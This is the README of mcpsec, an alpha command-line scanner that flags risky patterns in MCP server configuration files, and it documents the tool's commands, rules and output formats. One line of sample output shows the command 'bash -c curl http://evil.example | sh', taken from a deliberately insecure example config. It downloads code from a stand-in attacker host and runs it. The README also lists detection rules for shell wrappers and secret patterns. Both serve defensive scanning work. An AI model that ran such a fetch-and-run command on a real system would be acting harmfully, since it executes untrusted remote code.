# mcpsec

A CLI-first security scanner for **MCP (Model Context Protocol)** configurations.
It inventories the MCP servers declared in your config files and flags risky
patterns — hardcoded secrets, shell wrappers, world-readable filesystem mounts,
plaintext transports, and more — as human-readable, JSON, or SARIF output.

> **Customer alpha:** `mcpsec` is early alpha software. Its rules are static
> heuristics intended to catch obvious risky MCP configuration patterns and to
> support human review. Expect false positives and false negatives; do not treat
> it as the only security control or as a compliance/audit guarantee.

`mcpsec` is a small Python CLI. It depends on PyYAML so Hermes
`~/.hermes/config.yaml` audits work immediately; JSON configs are handled by the
Python standard library.

## Install / run

You can run `mcpsec` two ways.

For customer-alpha pilots, install the pinned alpha tag directly from GitHub:

```sh
python3 -m pip install "git+https://github.com/PFgo/mcpsec.git@v0.1.0-alpha"
mcpsec audit ~/.hermes/config.yaml
mcpsec scan path/to/mcp.json
mcpsec check path/to/mcp.json
mcpsec scan path/to/mcp.json --sarif > mcpsec.sarif
```

Use `audit` for a customer-friendly permission review of Hermes/Cursor/Claude
Desktop configs, `scan` for a human-readable inventory, `check` for
CI/pre-commit gating, and `--sarif` when you want to upload findings to a
code-scanning dashboard. See [Customer alpha quickstart](docs/QUICKSTART.md) for
the one-page trial flow and real-shape Hermes/Cursor/Claude demo configs.

Straight from a checkout, with no install:

```sh
PYTHONPATH=src python3 -m mcpsec scan examples/insecure.mcp.json
```

Or install it (editable) and use the `mcpsec` console script:

```sh
pip install -e .
mcpsec scan examples/insecure.mcp.json
```

The two are interchangeable — `PYTHONPATH=src python3 -m mcpsec ...` and
`mcpsec ...` accept identical arguments. The examples below use the `mcpsec`
form for brevity.

Requires Python 3.8+.

## Commands

### `mcpsec audit [path]`

Customer-friendly permission review for real app configs. It is equivalent to
`review`, but named for the way customers think about checking Hermes, Cursor,
or Claude Desktop MCP permissions.

```sh
mcpsec audit ~/.hermes/config.yaml
mcpsec audit ~/.cursor/mcp.json
mcpsec audit "$HOME/Library/Application Support/Claude/claude_desktop_config.json"
```

Use `--json` for machine-readable output. Omit `path` to auto-discover known
locations.

### `mcpsec scan [path]`

Inventory the MCP servers in a config file (or every `*.json` / `.mcp.json` in a
directory) and run the risk rules. Omit `path` to auto-discover well-known
locations (Claude Desktop, Cursor, Hermes, and `./mcp.json` / `./.mcp.json`).

```sh
mcpsec scan examples/insecure.mcp.json
```

```text
examples/insecure.mcp.json
  • shell-runner         command: bash -c curl http://evil.example | sh
  • insecure-remote      url: http://insecure.example.com/sse
  • filesystem-root      command: npx -y @modelcontextprotocol/server-filesystem /
  • sampler              command: npx fake-sampling-server@2.0.0

Total: 4 servers across 1 config file

Findings:
  [HIGH] MCPSEC005  filesystem-root
      argument '/' grants filesystem-wide access
      fix: Scope the path to a specific subdirectory.
  ...
Summary: HIGH 3  MEDIUM 2  LOW 1  INFO 0
```

### `mcpsec scan --json`

Emit the same scan as a machine-readable JSON document (see
[Output formats](#output-formats) for the schema).

```sh
mcpsec scan examples/insecure.mcp.json --json
```

### `mcpsec scan --sarif`

Emit a [SARIF 2.1.0](https://sarifweb.azurewebsites.net/) report, suitable for
upload to code-scanning dashboards. Mutually exclusive with `--json`.

```sh
mcpsec scan examples/insecure.mcp.json --sarif
```

### `mcpsec explain <server> [path]`

Focus on a single named server: print its transport, its env/header *key names*
(secret values are never printed), and the rules it trips. Reads `path` if given,
otherwise auto-discovers like `scan`.

```sh
mcpsec explain filesystem-root examples/insecure.mcp.json
```

```text
filesystem-root  (examples/insecure.mcp.json)
  transport: command: npx -y @modelcontextprotocol/server-filesystem /
  [HIGH] MCPSEC005: argument '/' grants filesystem-wide access
      fix: Scope the path to a specific subdirectory.
  [MEDIUM] MCPSEC003: package '@modelcontextprotocol/server-filesystem' is run via npx without a pinned version
      fix: Pin an exact version, e.g. package@1.2.3.
  [LOW] MCPSEC004: npx is invoked with auto-install (-y/--yes)
      fix: Review the package before enabling auto-install.
```

### `mcpsec review [path] [--format markdown|json]`

Render a permission-oriented security review for a config file, directory, or the
auto-discovered MCP config locations. Unlike `check`, this command is designed for
humans deciding whether to approve a server: it groups findings by server,
summarizes risky permissions, and returns a top-level decision.

```sh
mcpsec review examples/insecure.mcp.json --format markdown
```

```text
# MCP Permission Review

Decision: DENY
Servers reviewed: 4
Findings: 6 total — HIGH 3, MEDIUM 2, LOW 1, INFO 0

## High-risk servers

### filesystem-root
- Risk: HIGH
- Recommended action: DENY
- Permissions:
  - Filesystem-wide access
  - Unpinned package execution
  - Auto-install package execution
```

Machine-readable output is available with either `--format json` or `--json`:

```sh
mcpsec review examples/insecure.mcp.json --format json
```

The JSON object includes `decision`, `summary`, and per-server entries with
`risk`, `recommendation`, `permissions`, `env_keys`, `header_keys`, and redacted
`findings`. Decisions are intentionally conservative: any `HIGH` finding yields
`DENY`; `MEDIUM` without `HIGH` yields `REVIEW`; clean configs yield `APPROVE`.

### `mcpsec policy init`

Write a policy template (`./mcpsec.policy.json` by default) listing every rule
with its default severity, so you can hand-edit it to disable rules or adjust
severities. Use `--output <path>` to choose the destination and `--force` to
overwrite an existing file.

```sh
mcpsec policy init --output mcpsec.policy.json
```

### `mcpsec policy suggest [path] [--output PATH]`

Generate a conservative starter policy from an existing MCP config file,
directory, or the auto-discovered well-known config locations. It reuses the
same risk analysis and redaction behavior as `review`, then emits a JSON policy
with per-server decisions.

```sh
mcpsec policy suggest examples/insecure.mcp.json --json
```

The default output is JSON on stdout. `--format json` and `--json` are accepted
for consistency with other commands. Use `--output <path>` to write the suggested
policy to a file instead:

```sh
mcpsec policy suggest examples/insecure.mcp.json --output mcpsec.policy.json
```

Suggested decisions are intentionally conservative:

- clean / approved servers become `allow`
- review-worthy servers become `review`
- high-risk denied servers become `deny`
- unknown future servers default to `review`

The generated document includes `version`, `generated_by`, `source`, `defaults`,
`fail_on`, `rules`, and a `servers` object keyed by server name. Secret-looking
values are redacted or omitted; only env/header key names and redacted finding
messages are included. The file is directly usable with `mcpsec check --policy`:
server decisions of `review` or `deny` make that server's findings blocking,
while `allow` suppresses findings for explicitly accepted servers.

### `mcpsec check [path] [--policy PATH] [--json]`

Run the same scan as `mcpsec scan`, then **gate** on the results: `check` exits
non-zero when a finding meets or exceeds a *fail threshold*, which makes it
suitable for CI pipelines and pre-commit hooks. It accepts the same inputs as
`scan` — a file, a directory, or (omitting `path`) the auto-discovered well-known
locations.

The default fail threshold is **HIGH**, so any `HIGH` finding blocks:

```sh
mcpsec check examples/insecure.mcp.json
```

```text
FAIL
threshold: HIGH
findings: 6 total, 3 blocking
severity: HIGH 3  MEDIUM 2  LOW 1  INFO 0
Blocking findings:
  [HIGH] MCPSEC005  filesystem-root
      argument '/' grants filesystem-wide access
      fix: Scope the path to a specific subdirectory.
  ...
```

A clean config reports `PASS` with `0 total, 0 blocking` and exits `0`:

```sh
mcpsec check examples/clean.mcp.json
```

```text
PASS
threshold: HIGH
findings: 0 total, 0 blocking
severity: HIGH 0  MEDIUM 0  LOW 0  INFO 0
No blocking findings.
```

`--policy <path>` reads a policy file written by
[`mcpsec policy init`](#mcpsec-policy-init). The policy sets the `fail_on`
threshold and a per-rule `enabled` flag and `severity` override: disabled rules
never block (their findings are dropped), and a severity override changes whether
a finding meets the threshold.

`--json` emits a machine-readable result instead of the human report — a single
object with the keys `pass`, `threshold`, `counts`, `blocking_findings`, and
`findings`.

**Exit codes:** `0` — no blocking finding (pass); `1` — at least one blocking
finding (fail); `2` — invalid usage or a policy file that could not be parsed.

### `mcpsec rules`

List the built-in rule catalogue without scanning anything. The default output
prints one line per rule — rule ID, default severity, and short description —
sorted by rule ID, with a trailing count.

```sh
mcpsec rules
```

```text
MCPSEC001  HIGH    a literal secret value, or a secret-named key with a value.
MCPSEC002  MEDIUM  a header carrying authentication credentials.
...
MCPSEC009  MEDIUM  the server requests sampling (model-completion callbacks).

Total: 9 rules
```

`--json` emits a single JSON object with `version` (the mcpsec version string)
and `rules` (a list of `{ "rule_id", "severity", "description" }` objects, sorted
by `rule_id`):

```sh
mcpsec rules --json
```

`--sarif` emits a [SARIF 2.1.0](https://sarifweb.azurewebsites.net/) document
(`version: "2.1.0"`) describing the catalogue. Every rule is listed under
`runs[0].tool.driver.rules` with its `shortDescription` and a
`defaultConfiguration.level` (its default severity mapped to a SARIF level:
`HIGH → error`, `MEDIUM → warning`, `LOW`/`INFO → note`). Because `rules` scans
nothing, `runs[0].results` is an empty list. Mutually exclusive with `--json`.

```sh
mcpsec rules --sarif
```

The catalogue is derived from the same rule metadata and docstrings the engine
uses, so it always stays in step with the rules below.

## Rules

`mcpsec` ships nine static rules. Each fires per server and is assigned a default
severity (`HIGH` / `MEDIUM` / `LOW` / `INFO`).

| ID         | Severity | What it flags | Recommended fix |
| ---------- | -------- | ------------- | --------------- |
| MCPSEC001  | HIGH     | An inline/hardcoded secret in an `env` var or header — a value matching a known secret pattern (e.g. `sk-…`, `ghp_…`, `AKIA…`), or a secret-named key (`*TOKEN*`, `*SECRET*`, `*PASSWORD*`, `*API_KEY*`) with a value. | Move it to a secret manager / inject it from the environment at runtime. |
| MCPSEC002  | MEDIUM   | A header carrying authentication credentials (`Authorization`, `X-API-Key`, `Api-Key`). | Avoid embedding auth in config; inject credentials at runtime. |
| MCPSEC003  | MEDIUM   | An `npx`/`uvx` package run without a pinned exact version (e.g. `pkg` instead of `pkg@1.2.3`). | Pin an exact version, e.g. `package@1.2.3`. |
| MCPSEC004  | LOW      | An `npx`/`uvx` invocation with auto-install (`-y` / `--yes`). | Review the package before enabling auto-install. |
| MCPSEC005  | HIGH     | An argument granting filesystem-wide access (`/`, `~`, `$HOME`, or a drive root like `C:\`). | Scope the path to a specific subdirectory. |
| MCPSEC006  | HIGH     | A shell wrapper — a shell run with `-c` (`bash -c …`), or a command piped into a shell (`… \| sh`). | Invoke the target binary directly instead of through a shell. |
| MCPSEC007  | HIGH     | A remote server reached over plaintext `http://`. | Use an `https://` endpoint. |
| MCPSEC008  | INFO     | A remote `https://` endpoint worth reviewing for trust (informational; fires for every `https://` server). | Confirm the endpoint is operated by a trusted party. |
| MCPSEC009  | MEDIUM   | A server that requests **sampling** (model-completion callbacks). | Confirm sampling/LLM-callback is intended; it lets the server request model completions. |

## Output formats

**Human report** (default) — a per-file inventory of servers (name + transport),
a `Findings:` section listing each finding as `[SEVERITY] RULE_ID server`, its
message, and a suggested `fix:`, followed by a one-line `Summary:` with per-
severity counts. When nothing trips, the section reads `No findings.`

**`--json`** — a single JSON object with these top-level keys:

| Key        | Value |
| ---------- | ----- |
| `version`  | The mcpsec version string. |
| `configs`  | List of scanned files, each `{ "path", "servers" }` (server count). |
| `servers`  | Flattened list of every server: `name`, `source_file`, `command`, `args`, `env`, `url`, `headers`, `sampling`. |
| `findings` | List of findings, each `rule_id`, `severity`, `server`, `message`, `fix`, `location`. |

**`--sarif`** — a [SARIF 2.1.0](https://sarifweb.azurewebsites.net/) document
(`version: "2.1.0"`). The fired rules are listed under
`runs[0].tool.driver.rules`, and each finding becomes a `runs[0].results[]`
entry. Severities map to SARIF levels: `HIGH → error`, `MEDIUM → warning`,
`LOW`/`INFO → note`.

## Examples

Two ready-to-scan configs live in [`examples/`](examples/):

- [`examples/insecure.mcp.json`](examples/insecure.mcp.json) — trips several
  rules (shell wrapper, broad filesystem path, plaintext `http://`, unpinned
  `npx`, sampling). All values are obviously-fake placeholders.
- [`examples/clean.mcp.json`](examples/clean.mcp.json) — a well-configured
  config that produces **no findings**.

## Threat model & limitations

`mcpsec` is a **static, read-only config scanner**: it parses config files and
applies heuristics. It does not execute servers, make network requests, or scan
your home directory at large. Findings are heuristic and meant to guide human
review, not replace it. See [`docs/THREAT_MODEL.md`](docs/THREAT_MODEL.md) for
what it does and does not do, and for known false positives/negatives.

## Development

```sh
# Run the test suite (pure stdlib, no install required):
PYTHONPATH=src python3 -m unittest discover -s tests
```

## Continuous integration

The test suite is pure stdlib, so CI needs nothing beyond a checkout and Python.
A minimal GitHub Actions workflow that runs the suite on every pull request and
on pushes to `main` (the full version lives in
[`.github/workflows/test.yml`](.github/workflows/test.yml)):

```yaml
name: tests

on:
  pull_request:
  push:
    branches:
      - main

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"
      - run: PYTHONPATH=src python -m unittest discover -s tests -v
```

Because `mcpsec check` exits non-zero when a finding meets the fail threshold, it
can also gate the pipeline on policy: add a step such as
`PYTHONPATH=src python -m mcpsec check . --policy mcpsec.policy.json`, and a
failing scan fails the job.
